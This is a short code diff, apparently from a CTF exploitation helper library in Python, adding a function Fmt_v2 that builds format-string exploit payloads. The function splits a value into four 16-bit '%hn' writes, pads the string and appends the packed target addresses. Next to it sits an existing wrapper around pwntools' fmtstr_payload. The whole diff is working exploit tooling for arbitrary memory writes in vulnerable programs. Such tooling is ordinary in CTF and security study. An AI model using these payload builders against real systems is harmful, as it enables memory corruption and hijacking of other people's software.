@@ -73,3 +73,18 @@ def Fmt(offset, address,value,flag=1,per_byte='byte',padding_char='\x00',bits=No
         # return address+fmtstr, and sometimes it will crash
         return fmtstr_payload(offset,{address,value},write_size=per_byte)
     return payload
+
+def Fmt_v2(offset,address,value):
+    # from @Lewis
+    payload = ""
+    t = value
+    last = 0
+    padding=0x60
+    for i in range(4):
+        payload += "%{}d%{}$hn".format(t % 0x10000 - last + 0x10000, offset+padding/8+i) #t % 0x10000 - last + 0x10000
+        last = t % 0x10000
+        t = t >> 16
+    payload = payload.ljust(padding, "\x00")
+    for i in range(4):
+        payload += p64(address + i * 2)
+    return payload
